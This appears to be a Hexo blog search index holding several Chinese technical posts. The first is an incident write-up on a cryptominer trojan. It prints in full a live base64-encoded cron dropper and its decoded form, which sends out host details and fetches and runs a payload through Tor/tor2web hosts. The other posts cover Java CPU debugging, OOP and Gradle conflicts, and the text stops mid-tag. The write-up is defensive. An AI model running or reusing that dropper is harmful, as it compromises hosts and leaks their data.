<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>记录一次木马进程导致CPU 700%处理经过</title>
      <link href="/2020/11/13/trojan-process-cpu-100/"/>
      <url>/2020/11/13/trojan-process-cpu-100/</url>
      
        <content type="html"><![CDATA[<h2 id="事件描述"><a href="#事件描述" class="headerlink" title="事件描述"></a>事件描述</h2><p>登陆到测试服务器，发现CPU使用率飙到了700%，可能是机器被攻击。看进程名称，是一个异常进程在搞怪。<br><img src="F4C55F2F-BAE1-43E7-9444-98B7B0F1783D.png" alt></p><h2 id="处理过程"><a href="#处理过程" class="headerlink" title="处理过程"></a>处理过程</h2><ol><li>为了让机器尽快恢复，用<code>kill -9 18616</code>杀掉了这个进程。<br>没想到一会儿进程又出现了，CPU继续飙升。猜测应该是有定时任务在运行</li><li>执行<code>crontab -l</code> 发现果然有一条定时任务。<br><code>57 * * * * /root/.systemd-service.sh &gt; /dev/null 2&gt;&amp;1 &amp;</code><br><img src="1B372739-4214-4D44-A1F4-346BBF8C45E0.png" alt></li><li>此时执行<code>crontab -e</code> 删除掉定时任务。过了一会流氓进程又死灰复燃。应该是还有其他定时任务，或者主进程没有清理</li><li>定位到脚本<br>定位到定时任务脚本(仅供学习)：<pre class="line-numbers language-shell"><code class="language-shell">#!/bin/bash#exec &>/dev/nullecho GmqsLAjf/AU0zNSys0cvX3jvDVQ+RgnpxMER8UQt5sWoBaWlXHA7Zevn9+vXesLeecho R21xc0xBamYvQVUwek5TeXMwY3ZYM2p2RFZRK1JnbnB4TUVSOFVRdDVzV29CYVdsWEhBN1pldm45K3ZYZXNMZQpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICJ5cnh4eHFpYTQ1eHhjZHFmd3l4NHBrNnVmeWFuYXpkd2pidjNkZTdyNG1ydHl6dHQ1bXB3MzV5ZCIpCgpzb2NreigpIHsKbj0oZG9oLmRlZmF1bHRyb3V0ZXMuZGUgZG5zLmhvc3R1eC5uZXQgZG5zLmRucy1vdmVyLWh0dHBzLmNvbSB1bmNlbnNvcmVkLmx1eDEuZG5zLm5peG5ldC54eXogZG5zLnJ1YnlmaXNoLmNuIGRucy50d25pYy50dyBkb2guY2VudHJhbGV1LnBpLWRucy5jb20gZG9oLmRucy5zYiBkb2gtZmkuYmxhaGRucy5jb20gZmkuZG9oLmRucy5zbm9weXRhLm9yZyBkbnMuZmxhdHVzbGlmaXIuaXMgZG9oLmxpIGRucy5kaWdpdGFsZS1nZXNlbGxzY2hhZnQuY2gpCnA9JChlY2hvICJkbnMtcXVlcnk/bmFtZT1yZWxheS50b3Iyc29ja3MuaW4iKQpzPSQoJGMgaHR0cHM6Ly8ke25bJCgoUkFORE9NJTEzKSldfS8kcCB8IGdyZXAgLW9FICJcYihbMC05XXsxLDN9XC4pezN9WzAtOV17MSwzfVxiIiB8dHIgJyAnICdcbid8c29ydCAtdVJ8aGVhZCAtMSkKfQoKZmV4ZSgpIHsKZm9yIGkgaW4gLiAkSE9NRSAvdXNyL2JpbiAkZCAvdG1wIC92YXIvdG1wIDtkbyBlY2hvIGV4aXQgPiAkaS9pICYmIGNobW9kICt4ICRpL2kgJiYgY2QgJGkgJiYgLi9pICYmIHJtIC1mIGkgJiYgYnJlYWs7ZG9uZQp9Cgp1KCkgewpzb2NregpmZXhlCmY9L2ludC4kKHVuYW1lIC1tKQp4PS4vJChkYXRlfG1kNXN1bXxjdXQgLWYxIC1kLSkKcj0kKGN1cmwgLTRmc1NMayBjaGVja2lwLmFtYXpvbmF3cy5jb218fGN1cmwgLTRmc1NMayBpcC5zYilfJCh3aG9hbWkpXyQodW5hbWUgLW0pXyQodW5hbWUgLW4pXyQoaXAgYXxncmVwICdpbmV0ICd8YXdrIHsncHJpbnQgJDInfXxtZDVzdW18YXdrIHsncHJpbnQgJDEnfSlfJChjcm9udGFiIC1sfGJhc2U2NCAtdzApCiRjIC14IHNvY2tzNWg6Ly8kczo5MDUwICR0Lm9uaW9uJGYgLW8keCAtZSRyIHx8ICRjICQxJGYgLW8keCAtZSRyCmNobW9kICt4ICR4OyR4O3JtIC1mICR4Cn0KCmZvciBoIGluIHRvcjJ3ZWIuaW4gdG9yMndlYi5pdCBvbmlvbi5mb3VuZGF0aW9uIHRvcjJ3ZWIuc3Ugb25pb24uY29tLmRlIG9uaW9uLnNoIHRvcjJ3ZWIuaW8KZG8KaWYgISBscyAvcHJvYy8kKGhlYWQgLTEgL3RtcC8uWDExLXVuaXgvMDEpL3N0YXR1czsgdGhlbgp1ICR0LiRoCmVsc2UKYnJlYWsKZmkKZG9uZQo=|base64 -d|bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>发现shell内容用base64编码过了。用base64进行解码，发现是挖矿脚本。<pre class="line-numbers language-shell"><code class="language-shell">exec &>/dev/nullexport PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbind=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)c=$(echo "curl -4fsSLkA- -m200")t=$(echo "yrxxxqia45xxcdqfwyx4pk6ufyanazdwjbv3de7r4mrtyztt5mpw35yd")sockz() {n=(doh.defaultroutes.de dns.hostux.net dns.dns-over-https.com uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org dns.flatuslifir.is doh.li dns.digitale-gesellschaft.ch)p=$(echo "dns-query?name=relay.tor2socks.in")s=$($c https://${n[$((RANDOM%13))]}/$p | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" |tr ' ' '\n'|sort -uR|head -1)}fexe() {for i in . $HOME /usr/bin $d /tmp /var/tmp ;do echo exit > $i/i && chmod +x $i/i && cd $i && ./i && rm -f i && break;done}u() {sockzfexef=/int.$(uname -m)x=./$(date|md5sum|cut -f1 -d-)r=$(curl -4fsSLk checkip.amazonaws.com||curl -4fsSLk ip.sb)_$(whoami)_$(uname -m)_$(uname -n)_$(ip a|grep 'inet '|awk {'print $2'}|md5sum|awk {'print $1'})_$(crontab -l|base64 -w0)$c -x socks5h://$s:9050 $t.onion$f -o$x -e$r || $c $1$f -o$x -e$rchmod +x $x;$x;rm -f $x}for h in tor2web.in tor2web.it onion.foundation tor2web.su onion.com.de onion.sh tor2web.iodoif ! ls /proc/$(head -1 /tmp/.X11-unix/01)/status; thenu $t.$helsebreakfidone<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>用<code>lsof -c 进程名</code>查看该进程的系统调用信息。发现相应控制客户端已经删除使用。<br><img src="22B9B55F-B9BB-4FB9-BA4A-79C2D88689A5.png" alt></li><li><code>pstree</code> 可以看到两个异常进程。用<code>ps -ef</code>获取异常进程信息。一个应该是主进程，一个应该是控制进程。</li><li><code>kill -9 两个木马进程ID</code>删除掉进程。过了一会又启动，推测是有定时任务没清理干净。使用命令<code>ls /etc/cron.d</code>查看到里面还有一个0开头的文件存放着定时任务。<br>删除，然后删掉两个木马进程。删掉垃圾脚本</li><li>系统恢复了短暂的宁静又出现了。查看登陆日志<code>tail -F -n 1000 /var/log/auth.log | grep &#39;failed&#39;</code> ,内网主机在ssh攻击破解。<br>解决办法：<br>修改密码<br>安装fail2ban安全工具<pre class="line-numbers language-shell"><code class="language-shell">sudo apt-get upgradesudo apt-get install -y fail2bansudo systemctl start fail2bansudo nano /etc/fail2ban/jail.local#jail.local 文件内添加[sshd]enabled = trueport = 22filter = sshdlogpath = /var/log/auth.logmaxretry = 3sudo systemctl restart fail2ban<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="005A7DC9-BDD5-4059-A459-90643A3E91C2.png" alt></li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>服务器安全问题不容忽视，设置强密码，并控制防火墙，修改ssh默认端口号。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.base64decode.org/" target="_blank" rel="noopener">base64编解码工具</a><br><a href="https://cloud.tencent.com/developer/article/1591665" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1591665【类似病毒】</a><br><a href="https://www.freebuf.com/articles/system/208804.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/208804.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java进程导致CPU使用达到了100%，如何排查，定位，解决该问题？</title>
      <link href="/2020/11/13/java-process-cpu-100/"/>
      <url>/2020/11/13/java-process-cpu-100/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>开发生产中，有时候我们会碰到告警，CPU过高，超过100%，这个时候我们应该怎么办？</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="java进程导致CPU过高"><a href="#java进程导致CPU过高" class="headerlink" title="java进程导致CPU过高"></a>java进程导致CPU过高</h3><h4 id="定位耗费CPU的进程"><a href="#定位耗费CPU的进程" class="headerlink" title="定位耗费CPU的进程"></a>定位耗费CPU的进程</h4><p><code>top -c</code>命令,显示进程列表。然后输入P(大写),按照CPU排序。<br><img src="49D3D198-C786-4A88-AE17-30EAF6CFE578.png" alt><br>如果是Java进程引起的CPU偏高，然后分析为什么这个Java进程对应的线程。进而找到原因。</p><h4 id="定位耗费CPU的线程"><a href="#定位耗费CPU的线程" class="headerlink" title="定位耗费CPU的线程"></a>定位耗费CPU的线程</h4><p><code>top -Hp 进程ID</code>，输入P按照CPU排序。<br><img src="589EC661-44B6-492A-B1B2-6AE71BB007E2.png" alt></p><h4 id="定位哪段代码导致CPU过高"><a href="#定位哪段代码导致CPU过高" class="headerlink" title="定位哪段代码导致CPU过高"></a>定位哪段代码导致CPU过高</h4><p><code>printf &quot;%x\n&quot; 线程ID</code> 把线程pid转换为16进制。<br><img src="DD7F696C-FBEB-4925-BD84-FD6FB267022F.png" alt><br>然后用jstack命令打印进程的堆栈信息，通过grep那个线程的16进制pid，找到那个线程相关的东西。在打印的对战信息中，查找是哪个类的哪个方法导致的CPU 100%的问题。然后去解决问题。<br><code>jstack 进程ID ｜ grep &#39;0x16进制线程ID&#39; -C5 --color</code><br><img src="810E40C9-706F-4950-9D3F-49BC088E012B.png" alt><br>最后得知是代码中存在死循环导致的（测试使用，要是想让CPU跑的更满，可以启用自己CPU一致的线程数，分别死循环）：<br><img src="230B3B03-8067-4628-BBF0-4FEACADFCF27.png" alt></p><p>修改代码，解决问题。</p><p>注意：<br>在编写代码时候，注意循环条件推出方式</p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面向对象的理解</title>
      <link href="/2020/08/12/object-oritened-feature/"/>
      <url>/2020/08/12/object-oritened-feature/</url>
      
        <content type="html"><![CDATA[<h1 id="面向对象的理解"><a href="#面向对象的理解" class="headerlink" title="面向对象的理解"></a>面向对象的理解</h1><p>面向对象是一种编程风格，可以实现很多复杂的设计思路，是设计原则和设计模式编码实现的基础。</p><h2 id="抽象"><a href="#抽象" class="headerlink" title="抽象"></a>抽象</h2><p>抽象是一个很宽泛的名词，从大方面上讲，我们需要以面向对象的方式先抽象出业务对象，然后抽象出其属性和行为，最后进行封装。小的方面就是具体函数方法实现的抽象，他体现在接口类和抽象类上，调用者不需要理解具体实现，只需要知道自己调用的方法目的是什么即可。</p><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p>封装主要功能是信息隐藏和数据访问控制。<br>java是面向的对象的语言。项目是对功能代码的封装，包是对类的封装，类是对对象数据属性或行为的封装，变量是对属性的封装，函数是对行为的封装，通过不同的控制访问修饰符，去规范变量和行为的使用范围。<br>在使用方法或一些开源项目适合，不需要知道具体的实现方法，只要知道他实现了什么功能就可以了，简化了我们的工作<br>具体的封装需要对设计模式和设计原则有一定的认识，合理的使用抽象类，接口，类，并组织他们之间的关系有助于提高代码的可扩展性。</p><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>在对对象进行封装的同时，也要对其进行组织，合理的组织能提高代码的可复用性和可扩展性，而继承就是这样一个工具。将共性抽取出去形成父类，差异形成子类。更好的组织代码。<br>此处需要注意一个原则，里氏替换原则。当一个子类调用一个方法时，换成父类，程序逻辑不变。这是为了降低复杂度。<br>当继承是为了代码复用的时候，那么就不要覆盖父类的方法，子类只能通过自增方法实现功能。<br>当继承是为了实现多态的时候，父类最好是是抽象类和接口，通过实现父类的方法进行实现。<br>继承太多会使类结构复杂，可读性和维护性降低，代码复用也可以使用组合来实现。多用组合，少用继承。</p><h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p>子类可以替换父类，在实际代码运行过程中，调用字类的方法实现。<br>多态简单的说分为静态多态和动态多态，静态多态是方法的重载，动态多态是方法的重写。一句话概括就是，相同的引用调用相同的方法实现不同的功能，这是因为子类的各自的实现原因。它主要是为应对变化而生。可提高代码的可维护性，可扩展性。</p>]]></content>
      
      
      <categories>
          
          <category> 编程方法论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面向对象 </tag>
            
            <tag> 编程方法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gradle 如何定位和解决依赖冲突</title>
      <link href="/2020/07/21/gradle-jar-conclict/"/>
      <url>/2020/07/21/gradle-jar-conclict/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>在开发过程中，我们不仅要引入我们其他项目的jar包，同时随着业务的复杂度加深，也免不了要引入许多的第三方开源库，那么不可避免的会出现依赖冲突的错误。</p><h2 id="如何定位依赖冲突"><a href="#如何定位依赖冲突" class="headerlink" title="如何定位依赖冲突"></a>如何定位依赖冲突</h2><h3 id="排除法"><a href="#排除法" class="headerlink" title="排除法"></a>排除法</h3><p>排除法很简单，但是很耗时，就是选择一个依赖一个依赖的注释、编译、看结果。</p><h3 id="IDEA-gradle可视化"><a href="#IDEA-gradle可视化" class="headerlink" title="IDEA gradle可视化"></a>IDEA gradle可视化</h3><p>idea给我们提供了一个依赖树，但树只是一个平面图，并不是十分的直观。<br><img src="5C266554-7D51-4A1F-9F22-11F05CF908F7.png" alt></p><h3 id="Gradle-Task"><a href="#Gradle-Task" class="headerlink" title="Gradle Task"></a>Gradle Task</h3><p>Gradle提供了一个task：dependencies，这个task能在命令行中显示依赖树之间的依赖关系。双击执行后就能在命令行中打印相关的依赖信息了.可以看到不同的buildType的信息<br><img src="A158B8C5-DE3C-4375-B120-380F66118503.png" alt><br>除了UI点击之外，也可通过命令行的方式来获取依赖树。</p><pre class="line-numbers language-gradle"><code class="language-gradle"># implementation 指定的buildType信息./gradlew app:dependencies -q --configuration implementation<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里我提取一点：</p><pre class="line-numbers language-shell"><code class="language-shell">annotationProcessor - Annotation processors and their dependencies for source set 'main'.\--- org.projectlombok:lombok:1.18.4apiElements - API elements for main. (n)No dependenciesarchives - Configuration for archive artifacts.No dependenciesasciidoctor+--- org.springframework.restdocs:spring-restdocs-asciidoctor -> 2.0.2.RELEASE+--- org.asciidoctor:asciidoctorj:1.5.3.2|    +--- org.jruby:jruby-complete:1.7.21|    \--- com.beust:jcommander:1.35\--- org.asciidoctor:asciidoctorj-groovy-dsl:1.0.0.preview2     +--- org.codehaus.groovy:groovy-all:1.8.9     \--- org.asciidoctor:asciidoctorj:1.5.1 -> 1.5.3.2 (*)bootArchives - Configuration for Spring Boot archive artifacts.No dependenciesimplementation - Implementation only dependencies for source set 'main'. (n)+--- project mbg-model (n)+--- project mbg-mapper (n)+--- project cmp-client (n)compileOnly - Compile only dependencies for source set 'main'.+--- org.springframework.boot:spring-boot-configuration-processor -> 2.1.1.RELEASE\--- org.projectlombok:lombok:1.18.4default - Configuration for default artifacts.+--- com.github.xiaoymin:knife4j-spring-ui:2.0.1+--- org.jsoup:jsoup:1.13.1+--- io.springside:springside-utils:5.0.0-RC1|    +--- com.google.guava:guava:20.0 -> 23.0|    |    +--- com.google.code.findbugs:jsr305:1.3.9 -> 3.0.1|    |    +--- com.google.errorprone:error_prone_annotations:2.0.18|    |    +--- com.google.j2objc:j2objc-annotations:1.1|    |    \--- org.codehaus.mojo:animal-sniffer-annotations:1.14|    +--- org.apache.commons:commons-lang3:3.5 -> 3.8.1|    \--- org.slf4j:slf4j-api:1.7.22 -> 1.7.25compile - Dependencies for source set 'main' (deprecated, use 'implementation' instead).+--- com.github.xiaoymin:knife4j-spring-ui:2.0.1+--- org.jsoup:jsoup:1.13.1\--- io.springside:springside-utils:5.0.0-RC1     +--- com.google.guava:guava:20.0     +--- org.apache.commons:commons-lang3:3.5 -> 3.8.1     \--- org.slf4j:slf4j-api:1.7.22 -> 1.7.25compileClasspath - Compile classpath for source set 'main'.+--- com.github.xiaoymin:knife4j-spring-ui:2.0.1+--- org.jsoup:jsoup:1.13.1+--- io.springside:springside-utils:5.0.0-RC1|    +--- com.google.guava:guava:20.0 -> 23.0|    |    +--- com.google.code.findbugs:jsr305:1.3.9 -> 2.0.1|    |    +--- com.google.errorprone:error_prone_annotations:2.0.18|    |    +--- com.google.j2objc:j2objc-annotations:1.1|    |    \--- org.codehaus.mojo:animal-sniffer-annotations:1.14|    +--- org.apache.commons:commons-lang3:3.5 -> 3.8.1|    \--- org.slf4j:slf4j-api:1.7.22 -> 1.7.25+--- org.springframework.boot:spring-boot-configuration-processor -> 2.1.1.RELEASE+--- org.projectlombok:lombok:1.18.4runtimeElements - Elements of runtime for main. (n)No dependenciesruntimeOnly - Runtime only dependencies for source set 'main'. (n)No dependenciestestAnnotationProcessor - Annotation processors and their dependencies for source set 'test'.\--- org.projectlombok:lombok:1.18.4testCompile - Dependencies for source set 'test' (deprecated, use 'testImplementation' instead).+--- com.github.xiaoymin:knife4j-spring-ui:2.0.1+--- org.jsoup:jsoup:1.13.1\--- io.springside:springside-utils:5.0.0-RC1     +--- com.google.guava:guava:20.0     +--- org.apache.commons:commons-lang3:3.5 -> 3.8.1     \--- org.slf4j:slf4j-api:1.7.22 -> 1.7.25testCompileClasspath - Compile classpath for source set 'test'.+--- com.github.xiaoymin:knife4j-spring-ui:2.0.1+--- org.jsoup:jsoup:1.13.1+--- io.springside:springside-utils:5.0.0-RC1|    +--- com.google.guava:guava:20.0 -> 23.0|    |    +--- com.google.code.findbugs:jsr305:1.3.9 -> 2.0.1|    |    +--- com.google.errorprone:error_prone_annotations:2.0.18|    |    +--- com.google.j2objc:j2objc-annotations:1.1|    |    \--- org.codehaus.mojo:animal-sniffer-annotations:1.14|    +--- org.apache.commons:commons-lang3:3.5 -> 3.8.1|    \--- org.slf4j:slf4j-api:1.7.22 -> 1.7.25testCompileOnly - Compile only dependencies for source set 'test'.\--- org.projectlombok:lombok:1.18.4testImplementation - Implementation only dependencies for source set 'test'. (n)+--- org.springframework.boot:spring-boot-starter-test (n)+--- org.mybatis.spring.boot:mybatis-spring-boot-starter-test:1.3.2 (n)\--- org.springframework.restdocs:spring-restdocs-mockmvc (n)testRuntime - Runtime dependencies for source set 'test' (deprecated, use 'testRuntimeOnly' instead).+--- com.github.xiaoymin:knife4j-spring-ui:2.0.1+--- org.jsoup:jsoup:1.13.1\--- io.springside:springside-utils:5.0.0-RC1     +--- com.google.guava:guava:20.0     +--- org.apache.commons:commons-lang3:3.5 -> 3.8.1     \--- org.slf4j:slf4j-api:1.7.22 -> 1.7.25testRuntimeClasspath - Runtime classpath of source set 'test'.+--- com.github.xiaoymin:knife4j-spring-ui:2.0.1+--- cn.ucloud.ufile:ufile-client-java:2.3.0 (*)+--- io.kubernetes:client-java:5.0.0 (*)+--- org.glassfish.jersey.core:jersey-client:2.11 (*)+--- org.glassfish.jersey.media:jersey-media-json-jackson:2.11 (*)+--- org.glassfish.jersey.core:jersey-common:2.11 (*)+--- org.apache.commons:commons-lang3:3.8.1+--- com.github.penggle:kaptcha:2.3.2|    +--- javax.servlet:javax.servlet-api:3.1.0 -> 4.0.1|    \--- com.jhlabs:filters:2.0.235-1+--- com.google.guava:guava:23.0 (*)+--- com.alibaba:fastjson:1.2.54+--- com.alibaba:druid-spring-boot-starter:1.1.10|    +--- com.alibaba:druid:1.1.10|    +--- org.slf4j:slf4j-api:1.7.25|    \--- org.springframework.boot:spring-boot-autoconfigure:1.5.12.RELEASE -> 2.1.1.RELEASE (*)+--- io.projectreactor:reactor-core:3.2.8.RELEASE|    \--- org.reactivestreams:reactive-streams:1.0.2+--- org.apache.poi:poi-ooxml:3.17|    +--- org.apache.poi:poi:3.17|    |    +--- commons-codec:commons-codec:1.10 -> 1.11|    |    \--- org.apache.commons:commons-collections4:4.1|    +--- org.apache.poi:poi-ooxml-schemas:3.17|    |    \--- org.apache.xmlbeans:xmlbeans:2.6.0|    |         \--- stax:stax-api:1.0.1|    \--- com.github.virtuald:curvesapi:1.04+--- com.squareup.okhttp3:okhttp:3.14.7 (*)+--- mysql:mysql-connector-java:6.0.6+--- org.mybatis.spring.boot:mybatis-spring-boot-starter:1.3.2 (*)+--- com.qcloud:cos_api:5.6.0 (*)+--- com.github.pagehelper:pagehelper-spring-boot-starter:1.2.10 (*)+--- tk.mybatis:mapper-spring-boot-starter:2.1.5|    +--- org.springframework.boot:spring-boot-starter:2.1.1.RELEASE (*)|    +--- org.springframework.boot:spring-boot-starter-jdbc:2.1.1.RELEASE (*)|    +--- org.mybatis:mybatis:3.4.6|    +--- org.mybatis:mybatis-spring:1.3.2|    +--- tk.mybatis:mapper-core:1.1.5|    |    \--- javax.persistence:persistence-api:1.0|    +--- tk.mybatis:mapper-base:1.1.5|    |    \--- javax.persistence:persistence-api:1.0|    +--- tk.mybatis:mapper-weekend:1.1.5|    +--- tk.mybatis:mapper-spring:1.1.5|    +--- tk.mybatis:mapper-extra:1.1.5|    +--- tk.mybatis:mapper-spring-boot-autoconfigure:2.1.5|    |    +--- org.springframework.boot:spring-boot-autoconfigure:2.1.1.RELEASE (*)|    |    +--- junit:junit:4.12 (*)|    |    \--- org.hsqldb:hsqldb:2.4.1|    +--- junit:junit:4.12 (*)|    \--- org.hsqldb:hsqldb:2.4.1+--- org.springframework.boot:spring-boot-devtools -> 2.1.1.RELEASE|    +--- org.springframework.boot:spring-boot:2.1.1.RELEASE (*)|    \--- org.springframework.boot:spring-boot-autoconfigure:2.1.1.RELEASE (*)+--- org.springframework.boot:spring-boot-starter-web -> 2.1.1.RELEASE|    +--- org.springframework.boot:spring-boot-starter:2.1.1.RELEASE (*)|    +--- org.springframework.boot:spring-boot-starter-json:2.1.1.RELEASE|    |    +--- org.springframework.boot:spring-boot-starter:2.1.1.RELEASE (*)|    |    +--- org.springframework:spring-web:5.1.3.RELEASE (*)|    |    +--- com.fasterxml.jackson.core:jackson-databind:2.9.7 (*)|    |    +--- com.fasterxml.jackson.datatype:jackson-datatype-jdk8:2.9.7|    |    |    +--- com.fasterxml.jackson.core:jackson-core:2.9.7|    |    |    \--- com.fasterxml.jackson.core:jackson-databind:2.9.7 (*)|    |    +--- com.fasterxml.jackson.datatype:jackson-datatype-jsr310:2.9.7|    |    |    +--- com.fasterxml.jackson.core:jackson-annotations:2.9.0|    |    |    +--- com.fasterxml.jackson.core:jackson-core:2.9.7|    |    |    \--- com.fasterxml.jackson.core:jackson-databind:2.9.7 (*)|    |    \--- com.fasterxml.jackson.module:jackson-module-parameter-names:2.9.7|    |         +--- com.fasterxml.jackson.core:jackson-core:2.9.7|    |         \--- com.fasterxml.jackson.core:jackson-databind:2.9.7 (*)|    +--- org.springframework.boot:spring-boot-starter-tomcat:2.1.1.RELEASE|    |    +--- javax.annotation:javax.annotation-api:1.3.2|    |    +--- org.apache.tomcat.embed:tomcat-embed-core:9.0.13|    |    +--- org.apache.tomcat.embed:tomcat-embed-el:9.0.13|    |    \--- org.apache.tomcat.embed:tomcat-embed-websocket:9.0.13|    |         \--- org.apache.tomcat.embed:tomcat-embed-core:9.0.13|    +--- org.hibernate.validator:hibernate-validator:6.0.13.Final (*)|    +--- org.springframework:spring-web:5.1.3.RELEASE (*)|    \--- org.springframework:spring-webmvc:5.1.3.RELEASE|         +--- org.springframework:spring-aop:5.1.3.RELEASE (*)|         +--- org.springframework:spring-beans:5.1.3.RELEASE (*)|         +--- org.springframework:spring-context:5.1.3.RELEASE (*)|         +--- org.springframework:spring-core:5.1.3.RELEASE (*)|         +--- org.springframework:spring-expression:5.1.3.RELEASE (*)|         \--- org.springframework:spring-web:5.1.3.RELEASE (*)+--- org.springframework.boot:spring-boot-starter-amqp -> 2.1.1.RELEASE|    +--- org.springframework.boot:spring-boot-starter:2.1.1.RELEASE (*)|    +--- org.springframework:spring-messaging:5.1.3.RELEASE|    |    +--- org.springframework:spring-beans:5.1.3.RELEASE (*)|    |    \--- org.springframework:spring-core:5.1.3.RELEASE (*)|    \--- org.springframework.amqp:spring-rabbit:2.1.2.RELEASE|         +--- org.springframework.amqp:spring-amqp:2.1.2.RELEASE|         |    +--- org.springframework:spring-core:5.1.3.RELEASE (*)|         |    \--- org.springframework.retry:spring-retry:1.2.2.RELEASE|         |         \--- org.springframework:spring-core:4.3.13.RELEASE -> 5.1.3.RELEASE (*)|         +--- com.rabbitmq:amqp-client:5.4.3|         |    \--- org.slf4j:slf4j-api:1.7.25|         +--- org.springframework:spring-context:5.1.3.RELEASE (*)|         +--- org.springframework:spring-messaging:5.1.3.RELEASE (*)|         \--- org.springframework:spring-tx:5.1.3.RELEASE (*)testRuntimeOnly - Runtime only dependencies for source set 'test'. (n)No dependencies<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="使用插件gradle-view"><a href="#使用插件gradle-view" class="headerlink" title="使用插件gradle-view"></a>使用插件gradle-view</h3><p>利用插件gradle-view可以直接通过面板的形式看到是哪个依赖库，具体是冲突了哪个版本。</p><p>插件地址：<a href="https://plugins.jetbrains.com/plugin/7150-gradle-view" target="_blank" rel="noopener">https://plugins.jetbrains.com/plugin/7150-gradle-view</a><br><img src="7CBE789B-24EF-490D-90CF-DA06919E8C62.png" alt></p><h2 id="如何解决冲突"><a href="#如何解决冲突" class="headerlink" title="如何解决冲突"></a>如何解决冲突</h2><h3 id="删除其中一个jar包"><a href="#删除其中一个jar包" class="headerlink" title="删除其中一个jar包"></a>删除其中一个jar包</h3><p>删除其中一个jar包。</p><h3 id="使用exclude来去除传递依赖"><a href="#使用exclude来去除传递依赖" class="headerlink" title="使用exclude来去除传递依赖"></a>使用exclude来去除传递依赖</h3><p>在知道是哪个库的哪些依赖的情况下,可以使用exclude来去除传递依赖，<br>        exclude module：过滤模块<br>        exclude group：过滤包名下所有依赖</p><p>如下：</p><pre class="line-numbers language-gradle"><code class="language-gradle">implementation("com.qcloud:cos_api:5.6.0") {        exclude group: 'org.slf4j'    }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="取消所有传递依赖"><a href="#取消所有传递依赖" class="headerlink" title="取消所有传递依赖"></a>取消所有传递依赖</h3><pre class="line-numbers language-gradle"><code 